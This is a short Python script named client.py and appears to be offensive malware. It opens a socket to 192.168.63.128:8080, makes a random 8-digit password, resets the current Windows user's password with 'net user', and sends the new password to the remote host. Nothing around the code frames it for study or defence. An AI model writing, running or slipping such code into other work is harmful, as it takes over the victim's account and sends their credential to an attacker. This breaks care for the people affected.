#client.py:

import socket
import getpass
import subprocess
import random

phone = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
phone.connect(('192.168.63.128', 8080))
user = getpass.getuser()
psd = ''
for j in range(1, 9):
    m = str(random.randrange(0, 10))
    psd = psd + m
subprocess.Popen(['net', 'user', user, psd])
phone.send(psd.encode('utf-8'))
back_msg = phone.recv(1024)
phone.close()